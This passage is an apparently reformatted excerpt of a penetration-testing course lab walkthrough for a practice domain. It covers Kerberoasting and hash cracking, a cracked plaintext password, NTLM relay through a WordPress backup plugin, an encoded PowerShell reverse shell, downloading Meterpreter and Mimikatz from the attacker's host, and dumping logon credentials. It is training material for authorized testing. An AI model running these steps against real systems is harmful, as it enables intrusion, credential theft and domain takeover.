### Optimized Text

**Mapped to INTERNALSRV1. Our assumption is that Daniela may be able to log in to the WordPress login page successfully.**

Since Daniela is kerberoastable, we can attempt to retrieve her password using this method. If we can crack the TGS-REP hash, we may be able to log in to WordPress and gain further access to INTERNALSRV1.

If this attack vector fails, we can use WPScan and other web application enumeration tools to identify potential vulnerabilities on INTERNALSRV1 or switch targets to MAILSRV1.

**Performing Kerberoasting on Kali with impacket-GetUserSPNs over the SOCKS5 proxy using Proxychains:**

To obtain the TGS-REP hash for Daniela, we need to provide the credentials of a domain user. Since we only have one valid set of credentials, we will use John.

```bash
kali@kali:~/beyond$ proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.6.240 beyond.com/john
```

**Output:**

```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
Password:
ServicePrincipalName Name MemberOf PasswordLastSet LastLogon
Delegation
------------------------ ------- -------- -------------------------- -------------
http/internalsrv1.beyond.com daniela 2022-09-29 04:17:20.062328 2022-10-05 03:59:48.376728
[-] CCache file is not found. Skipping...
$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$4c6c4600baa0ef09e40fde6130e3d770$49023c03dcf9a21ea5b943e179f843c575d8f54b1cd85ab12658364c23a46fa53b3db5f924a66b1b28143f6a357abea0cf89af42e08fc38d23b205a3e1b46aed9e181446fa7002def837df76ca5345e3277abaa86...2e430c5a8f0235b45b66c5fe0c8b4ba16efc91586fc22c2c9c1d8d0434d4901d32665cceac1ab0cdcb89ae2c2d688307b9c5d361beba29b75827b058de5a5bba8e60af3562f935bd34feebad8e94d44c0aebc032a3661001541b4e30a20d380cac5047d2dafeb70e1ca3f9e507eb72a4c7
```

**Storing the hash and cracking it with Hashcat:**

```bash
kali@kali:~/beyond$ sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
...
$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$b0750f4754ff26fe77d2288ae3cca539$0922083b88587a2e765298cc7d499b368f7c39c7f6941a4b419d8bb1405e7097891c1af0a885ee76ccd1f32e988d6c4653e5cf4ab9602004d84a6e1702d2fbd5a3379bd376de696b0e8993aeef5b1e78fb24f5d3c
...
3d3e9d5c0770cc6754c338887f11b5a85563de36196b00d5cddecf494cfc43fcbef3b73ade4c9b09c8ef405b801d205bf0b21a3bca7ad3f59b0ac7f6184ecc1d6f066016bb37552ff6dd098f934b2405b99501f22871
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 852
Made in Morocco
Penetration Testing with Kali Linux
28bff4071409cec4e9545d9fad76e6b18900b308eaac8b575f60bb:DANIelaRO123
...
```

**Cracking the TGS-REP hash:**

We successfully cracked the TGS-REP hash and obtained the plaintext password for Daniela. Let’s store the username and password in `creds.txt`.

We already established that no domain user has local Administrator privileges on any domain computers, and we cannot use RDP to log in to them. However, we may be able to use protocols such as WinRM to access other systems.

**Logging in to WordPress:**

Next, let’s try to log in to WordPress at `/wp-admin` via our forwarded port.

**Figure 304: Successful Login to WordPress as Daniela**

Great! We successfully logged in to the WordPress instance as Daniela. In the next section, we’ll leverage this access to gain access to another system.

### 24.5.2 Abuse a WordPress Plugin for a Relay Attack

In the previous section, we retrieved the plaintext password for Daniela and gained access to the WordPress dashboard on INTERNALSRV1. Let’s review some of the settings and plugins.

**Configured Users:**

**Figure 305: Daniela is the only WordPress user**

**General WordPress Settings:**

**Figure 306: General WordPress settings**

The WordPress Address (URL) and Site Address (URL) are DNS names as we assumed. All other settings in Settings are mostly default values. Let’s review the installed plugins next.

**Installed WordPress Plugins:**

**Figure 307: Installed WordPress Plugins**

**Backup Migration Plugin Settings:**

**Figure 308: Backup Migration plugin settings**

We can enter a path in this field, which will be used for storing the backup. We may abuse this functionality to force an authentication of the underlying system.

**Plan for Next Steps:**

At the moment, there are two promising attack vectors:

1. **Upload a Malicious WordPress Plugin:**
   By preparing and uploading a web shell or reverse shell, we may be able to obtain code execution on the underlying system.

2. **Review BloodHound Results:**
   As we have discovered, the local Administrator account has an active session on INTERNALSRV1. Based on this session, we can assume that this user account is used to run the WordPress instance.
   
   Furthermore, it’s not uncommon that the local Administrator accounts across computers in a domain are set up with the same password. Let’s assume this is true for the target environment.

   We also learned that the domain administrator Beccy has an active session on MAILSRV1, and therefore, the credentials of the user may be cached on the system.

   Due to SMB signing being disabled on MAILSRV1 and INTERNALSRV1, a relay attack is possible if we can force an authentication.

   Finally, we identified the Backup directory path field in the WordPress Backup Migration plugin containing the path for the backup destination. This may allow us to force such an authentication request.

**Plan for the Second Attack Vector:**

First, we’ll attempt to force an authentication request by abusing the Backup directory path of the Backup Migration WordPress plugin on INTERNALSRV1. By setting the destination path to our Kali machine, we can use `impacket-ntlmrelayx` to relay the incoming connection to MAILSRV1. If our assumptions are correct, the authentication request is made in the context of the local Administrator account on INTERNALSRV1, which has the same password as the local Administrator account on MAILSRV1.

If this attack is successful, we’ll obtain privileged code execution on MAILSRV1, which we can then leverage to extract the NTLM hash for Beccy and meet one of the primary goals of the penetration test.

Since the second attack vector not only results in code execution on a single system but also provides a potential vector to achieve one of the goals of the penetration test, we’ll perform the relay attack first.

**Setting Up impacket-ntlmrelayx:**

```bash
kali@kali:~/beyond$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.242 -c "powershell -enc JABjAGwAaQ..."
```

**Output:**

```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Protocol Client SMTP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
```

**Setting Up Netcat Listener:**

```bash
kali@kali:~/beyond$ nc -nvlp 9999
listening on [any] 9999 ...
```

**Modifying the Backup Directory Path:**

Let’s set the path to the URI reference `//192.168.119.5/test` where the IP is the address of our Kali machine and `test` is a nonexistent path.

**Figure 309: Modified Backup directory path**

Once entered, we can scroll down and click on Save. This should cause the WordPress plugin to authenticate to `impacket-ntlmrelayx` in the context of the user running WordPress.

**Executing Reverse Shell on MAILSRV1:**

```
[*] Authenticating against smb://192.168.50.242 as INTERNALSRV1/ADMINISTRATOR SUCCEED
...
[*] Service RemoteRegistry is in stopped state
...
[*] Starting service RemoteRegistry
...
[*] Executed specified command on host: 192.168.50.242
...
[*] Stopping service RemoteRegistry
```

**Incoming Reverse Shell:**

```
connect to [192.168.119.5] from (UNKNOWN) [192.168.50.242] 50063
whoami
nt authority\system
PS C:\Windows\system32> hostname
MAILSRV1
PS C:\Windows\system32>
```

Great! We successfully obtained code execution as NT AUTHORITY\SYSTEM by authenticating as a local Administrator on MAILSRV1 by relaying an authentication attempt from the WordPress plugin on INTERNALSRV1.

### 24.6 Gaining Access to the Domain Controller

This Learning Unit covers the following Learning Objectives:
- Gather information to prepare client-side attacks
- Leverage client fingerprinting to obtain information

In the previous Learning Unit, we gained access to MAILSRV1 as NT AUTHORITY\SYSTEM. Based on the information from enumerating the network, we’ll attempt to obtain domain Administrator privileges in this Learning Unit and use them to access the domain controller.

#### 24.6.1 Cached Credentials

As planned, we obtained privileged code execution on MAILSRV1. Our next step is to extract the password hash for the user Daniela, which has an active session on this system.

Depending on the objective of the penetration test, we should not skip the local enumeration of the MAILSRV1 system. This could reveal additional vulnerabilities and sensitive information, which we may miss if we directly attempt to extract the NTLM hash for Daniela.

Once we discover that no AV is running, we should upgrade our shell to Meterpreter. This will not only provide us with a more robust shell environment but also aid in performing post-exploitation.

**Downloading and Executing the Meterpreter Reverse Shell:**

```powershell
PS C:\Windows\system32> cd C:\Users\Administrator
PS C:\Users\Administrator> iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe
PS C:\Users\Administrator> .\met.exe
```

**Incoming Meterpreter Session:**

```
[*] Sending stage (200774 bytes) to 192.168.50.242
[*] Meterpreter session 2 opened (192.168.119.5:443 -> 192.168.50.242:50814)
```

**Interacting with the Session and Spawning a PowerShell Command Shell:**

```bash
msf6 post(multi/manage/autoroute) > sessions -i 2
[*] Starting interaction with 2...
meterpreter > shell
Process 416 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.1006]
(c) Microsoft Corporation. All rights reserved.
C:\Users\Administrator> powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Install the latest PowerShell for new features and improvements!
https://aka.ms/PSWindows
PS C:\Users\Administrator>
```

**Downloading and Launching Mimikatz:**

```powershell
PS C:\Users\Administrator> iwr -uri http://192.168.119.5:8000/mimikatz.exe -Outfile mimikatz.exe
PS C:\Users\Administrator> .\mimikatz.exe
.\mimi.exe
.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
.## ^ ##. "A La Vie, A L'Amour" - (oe.eo)
## / \ ## /*** Benjamin DELPY `gentilkiwi` ( PI:EMAIL )
## \ / ## > https://blog.gentilkiwi.com/mimikatz
'## v ##' Vincent LE TOUX ( PI:EMAIL )
'#####' > https://pingcastle.com / https://mysmartlogon.com ***/
```

**Obtaining SeDebugPrivilege and Listing Logon Passwords:**

```bash
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # sekurlsa::logonpasswords
...
Authentication Id : 0 ; 253683 (00000000:0003def3)
Session : Interactive from 1
User Name : beccy
Domain : BEYOND
Logon Server : DCSRV1
Logon Time : 3/8/2023 4:50:32 AM
```

---

This optimized text aims to be more coherent, clear, and professional, with improved formatting and structure.